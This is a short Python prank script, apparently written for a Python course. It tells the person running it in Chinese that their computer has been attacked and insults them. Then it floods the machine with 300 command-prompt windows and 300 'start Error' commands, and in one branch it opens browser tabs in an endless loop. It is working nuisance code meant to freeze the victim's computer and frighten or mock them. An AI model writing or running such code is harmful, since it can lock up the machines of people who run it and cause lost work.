'''
Author: TERRY
Date: 2022-05-03 21:31:19
LastEditors: TERRY
LastEditTime: 2022-05-04 21:37:16
FilePath: \Python系统课\little.py
Description: 
'''
import tkinter as tk
import os
import webbrowser as web
import random
import threading
import tkinter.messagebox as tm
import getpass
import time

from cv2 import Stitcher_ERR_CAMERA_PARAMS_ADJUST_FAIL
def step1():
    temp=0
    while temp<300:
        try:
            os.startfile('cmd')
        except:
            pass
        temp = temp+1    
def boss():
    time.sleep(5)
    while True:
        try:
            web.open('www')
        except:
            pass
def step2():
    for i in range(300):
        os.popen('start Error')

print('你的电脑被攻击了！')
print('你是猪吗')
print('是请输入1——否请输入2')
a=input()
if a=='1':
    print('诚实——第一轮也是最后一轮轰炸开始')
    time.sleep(2)
    step1()
else:
    print('不诚实啊')
    step1()
    time.sleep(2)
    step2()
    print('你是猪吗')
    print('是请输入1——否请输入2')
    a=input()
    if a=='1':
        print('识相')
        time.sleep(1)
    else:
        print('硬骨头_你的计算机即将GG')
        time.sleep(1)
        boss()

